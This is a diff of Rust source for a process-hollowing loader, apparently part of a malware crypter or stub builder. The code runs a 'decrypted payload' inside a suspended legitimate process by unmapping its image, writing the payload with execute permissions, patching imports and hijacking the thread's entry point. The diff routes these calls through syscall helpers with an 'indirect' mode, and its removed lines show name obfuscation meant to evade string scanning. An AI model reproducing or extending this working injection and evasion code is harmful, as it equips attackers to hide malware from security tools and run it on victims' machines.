@@ -1,22 +1,20 @@
 // --- Process hollowing (technique fragment) ---
 
-use windows::core::PSTR;
+use windows::core::{PCSTR, PSTR};
 use windows::Win32::Foundation::{CloseHandle, BOOL, HANDLE};
 use windows::Win32::System::Diagnostics::Debug::{
-    GetThreadContext, ReadProcessMemory, SetThreadContext, WriteProcessMemory, CONTEXT,
-    CONTEXT_FULL_AMD64,
+    GetThreadContext, SetThreadContext, CONTEXT, CONTEXT_FULL_AMD64,
 };
-use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
-use windows::Win32::System::Memory::{
-    VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VIRTUAL_ALLOCATION_TYPE,
-};
+use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
 use windows::Win32::System::Threading::{
-    CreateProcessA, GetExitCodeProcess, ResumeThread, WaitForSingleObject, CREATE_SUSPENDED,
-    PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, STARTUPINFOA,
+    CreateProcessA, GetExitCodeProcess, WaitForSingleObject, CREATE_SUSPENDED,
+    PROCESS_INFORMATION, STARTUPINFOA,
 };
 
-/// Signature of `NtUnmapViewOfSection` (ntdll.dll), resolved dynamically.
-type NtUnmapViewOfSectionFn = unsafe extern "system" fn(HANDLE, *const core::ffi::c_void) -> i32;
+// The kernel-facing calls (NtAllocateVirtualMemory, NtWriteVirtualMemory,
+// NtReadVirtualMemory, NtResumeThread, NtUnmapViewOfSection) go through the
+// `nt_*` helpers provided by the syscall layer, so this fragment is identical
+// for `build.stub.syscalls.mode: none` and `build.stub.syscalls.mode: indirect`.
 
 // --- PE constants ---
 const IMAGE_DOS_SIGNATURE: u16 = 0x5A4D;
@@ -31,6 +29,11 @@ struct Section {
     pointer_to_raw_data: u32,
 }
 
+/// `GetThreadContext`/`SetThreadContext` require a 16-byte aligned `CONTEXT`
+/// on x64; the `windows` binding only guarantees 8, so force it here.
+#[repr(align(16))]
+struct AlignedContext(CONTEXT);
+
 /// Minimal PE view.
 struct Pe {
     image_base: u64,
@@ -40,6 +43,8 @@ struct Pe {
     sections: Vec<Section>,
     reloc_rva: u32,
     reloc_size: u32,
+    import_rva: u32,
+    import_size: u32,
 }
 
 /// Runs the decrypted payload via process hollowing and returns its exit code.
@@ -91,6 +96,12 @@ fn parse_pe(image: &[u8]) -> Result<Pe, String> {
     } else {
         (0, 0)
     };
+    // Import directory (data directory index 1).
+    let (import_rva, import_size) = if num_dirs > 1 {
+        (read_u32(image, opt + 120)?, read_u32(image, opt + 124)?)
+    } else {
+        (0, 0)
+    };
 
     let section_table = opt + size_of_optional_header;
     let mut sections = Vec::with_capacity(num_sections);
@@ -115,6 +126,8 @@ fn parse_pe(image: &[u8]) -> Result<Pe, String> {
         sections,
         reloc_rva,
         reloc_size,
+        import_rva,
+        import_size,
     })
 }
 
@@ -175,6 +188,29 @@ fn apply_relocations(image: &mut [u8], pe: &Pe, delta: isize) -> Result<(), Stri
     Ok(())
 }
 
+/// Resolves the payload's import table and writes the resulting addresses into
+/// the image's IAT (in place, so the following `write_image` ships them to the
+/// target).
+///
+/// `LoadLibraryA`/`GetProcAddress` run in the *current* process: the system
+/// DLLs are mapped at one base per session, so their addresses are also valid
+/// in the target as long as the target has the DLL mapped. Imports that cannot
+/// be resolved abort here, before the thread is redirected (the payload must
+/// never start with a half-filled IAT).
+fn resolve_and_patch_imports(image: &mut [u8], pe: &Pe) -> Result<(), String> {
+    let imports = crate::resolve_imports(image, pe.import_rva, pe.import_size, |rva| {
+        rva_to_offset(pe, rva)
+    })
+    .map_err(|e| format!("could not resolve the payload's imports: {e}"))?;
+
+    for (iat_rva, address) in imports {
+        let offset = rva_to_offset(pe, iat_rva)
+            .ok_or_else(|| format!("the IAT slot at RVA 0x{iat_rva:08x} is not mapped"))?;
+        write_u64(image, offset, address)?;
+    }
+    Ok(())
+}
+
 fn run_stage_two(target: &str, image: &mut [u8], pe: &Pe) -> Result<HANDLE, String> {
     // 1. Create the target process suspended.
     let (process, thread) = spawn_suspended(target)?;
@@ -183,41 +219,53 @@ fn run_stage_two(target: &str, image: &mut [u8], pe: &Pe) -> Result<HANDLE, Stri
     let base = resolve_image_base(process, thread)?;
 
     // 3. Unmap the original image.
-    let unmap = resolve_unmap()?;
-    let status = unsafe { unmap(process, base as *const core::ffi::c_void) };
+    let status = crate::nt_unmap_view(process, base as *mut core::ffi::c_void);
     if status < 0 {
         return Err(format!("unmap failed (0x{:08x})", status as u32));
     }
 
-    // 4. Re-allocate memory at the same base.
-    let alloc = unsafe {
-        VirtualAllocEx(
-            process,
-            Some(base as *const core::ffi::c_void),
-            pe.size_of_image as usize,
-            VIRTUAL_ALLOCATION_TYPE(MEM_COMMIT.0 | MEM_RESERVE.0),
-            PAGE_EXECUTE_READWRITE,
-        )
-    };
-    if alloc.is_null() {
-        return Err("VirtualAllocEx failed".to_string());
+    // 4. Re-allocate memory at the same base. The helper writes the actual
+    //    base back through `address` (it may differ from the preferred one).
+    let mut address = base as *mut core::ffi::c_void;
+    let mut region_size = pe.size_of_image as usize;
+    let status = crate::nt_alloc_vm(
+        process,
+        &mut address,
+        0,
+        &mut region_size,
+        MEM_COMMIT.0 | MEM_RESERVE.0,
+        PAGE_EXECUTE_READWRITE.0,
+    );
+    if status < 0 {
+        return Err(format!("allocation failed (0x{:08x})", status as u32));
     }
+    let address = address as u64;
 
     // 5. Fix up relocations if the base differs from the preferred one.
-    let delta = base as isize - pe.image_base as isize;
+    let delta = address as isize - pe.image_base as isize;
     if delta != 0 {
         apply_relocations(image, pe, delta)?;
     }
 
-    // 6. Write the image.
-    write_image(process, base, image, pe)?;
+    // 6. Resolve the payload's imports and fill in its IAT. The addresses are
+    //    resolved in this process: the system DLLs share one base per session,
+    //    so a resolved address is valid in the target as well (as long as the
+    //    target has that DLL mapped — see the technique's README). Any failure
+    //    aborts before the thread is redirected, so the payload never runs with
+    //    a half-filled IAT.
+    resolve_and_patch_imports(image, pe)?;
 
-    // 7. Redirect the thread to the payload entry point.
-    redirect_entry(thread, base, pe.entry_point_rva)?;
+    // 7. Write the image (with the resolved IAT already in place).
+    write_image(process, address, image, pe)?;
 
-    // 8. Resume the thread and keep only the process handle.
-    if unsafe { ResumeThread(thread) } == u32::MAX {
-        return Err("ResumeThread failed".to_string());
+    // 8. Redirect the thread to the payload entry point.
+    redirect_entry(thread, address, pe.entry_point_rva)?;
+
+    // 9. Resume the thread and keep only the process handle.
+    let mut previous = 0u32;
+    let status = crate::nt_resume_thread(thread, &mut previous);
+    if status < 0 {
+        return Err(format!("resume failed (0x{:08x})", status as u32));
     }
     unsafe {
         let _ = CloseHandle(thread);
@@ -255,24 +303,25 @@ fn spawn_suspended(target: &str) -> Result<(HANDLE, HANDLE), String> {
 }
 
 fn resolve_image_base(process: HANDLE, thread: HANDLE) -> Result<u64, String> {
-    let mut ctx = CONTEXT::default();
-    ctx.ContextFlags = CONTEXT_FULL_AMD64;
-    unsafe { GetThreadContext(thread, &mut ctx) }
+    let mut ctx = AlignedContext(CONTEXT::default());
+    ctx.0.ContextFlags = CONTEXT_FULL_AMD64;
+    unsafe { GetThreadContext(thread, &mut ctx.0) }
         .map_err(|e| format!("GetThreadContext failed: {e}"))?;
 
     // On x64, Rdx holds the PEB address; ImageBaseAddress sits at PEB + 0x10.
-    let peb = ctx.Rdx;
+    let peb = ctx.0.Rdx;
     let mut base: u64 = 0;
-    unsafe {
-        ReadProcessMemory(
-            process,
-            (peb + 0x10) as *const core::ffi::c_void,
-            &mut base as *mut u64 as *mut core::ffi::c_void,
-            std::mem::size_of::<u64>(),
-            None,
-        )
+    let mut read = 0usize;
+    let status = crate::nt_read_vm(
+        process,
+        (peb + 0x10) as *const core::ffi::c_void,
+        &mut base as *mut u64 as *mut core::ffi::c_void,
+        std::mem::size_of::<u64>(),
+        &mut read,
+    );
+    if status < 0 {
+        return Err(format!("image base read failed (0x{:08x})", status as u32));
     }
-    .map_err(|e| format!("ReadProcessMemory failed: {e}"))?;
 
     Ok(base)
 }
@@ -300,41 +349,29 @@ fn write_remote(process: HANDLE, base: u64, data: &[u8]) -> Result<(), String> {
     if data.is_empty() {
         return Ok(());
     }
-    unsafe {
-        WriteProcessMemory(
-            process,
-            base as *const core::ffi::c_void,
-            data.as_ptr() as *const core::ffi::c_void,
-            data.len(),
-            None,
-        )
+    let mut written = 0usize;
+    let status = crate::nt_write_vm(
+        process,
+        base as *const core::ffi::c_void,
+        data.as_ptr() as *const core::ffi::c_void,
+        data.len(),
+        &mut written,
+    );
+    if status < 0 {
+        return Err(format!("write failed (0x{:08x})", status as u32));
     }
-    .map_err(|e| format!("WriteProcessMemory failed: {e}"))
-}
-
-fn redirect_entry(thread: HANDLE, base: u64, entry_rva: u32) -> Result<(), String> {
-    let mut ctx = CONTEXT::default();
-    ctx.ContextFlags = CONTEXT_FULL_AMD64;
-    unsafe { GetThreadContext(thread, &mut ctx) }
-        .map_err(|e| format!("GetThreadContext failed: {e}"))?;
-    ctx.Rcx = base + entry_rva as u64;
-    unsafe { SetThreadContext(thread, &ctx) }
-        .map_err(|e| format!("SetThreadContext failed: {e}"))?;
     Ok(())
 }
 
-fn resolve_unmap() -> Result<NtUnmapViewOfSectionFn, String> {
-    // The DLL and function names are substituted at build time with code that
-    // rebuilds them at runtime (obfuscated), so they do not appear in `strings`.
-    let ntdll = std::ffi::CString::new($NTDLL_DEF$).map_err(|_| "invalid ntdll name".to_string())?;
-    let unmap =
-        std::ffi::CString::new($UNMAP_FUNC_DEF$).map_err(|_| "invalid unmap name".to_string())?;
-
-    let module = unsafe { GetModuleHandleA(PCSTR(ntdll.as_ptr() as *const u8)) }
-        .map_err(|e| format!("GetModuleHandleA failed: {e}"))?;
-    let proc = unsafe { GetProcAddress(module, PCSTR(unmap.as_ptr() as *const u8)) };
-    let proc = proc.ok_or_else(|| "GetProcAddress failed".to_string())?;
-    Ok(unsafe { std::mem::transmute(proc) })
+fn redirect_entry(thread: HANDLE, base: u64, entry_rva: u32) -> Result<(), String> {
+    let mut ctx = AlignedContext(CONTEXT::default());
+    ctx.0.ContextFlags = CONTEXT_FULL_AMD64;
+    unsafe { GetThreadContext(thread, &mut ctx.0) }
+        .map_err(|e| format!("GetThreadContext failed: {e}"))?;
+    ctx.0.Rcx = base + entry_rva as u64;
+    unsafe { SetThreadContext(thread, &ctx.0) }
+        .map_err(|e| format!("SetThreadContext failed: {e}"))?;
+    Ok(())
 }
 
 fn wait_and_exit(process: HANDLE) -> i32 {
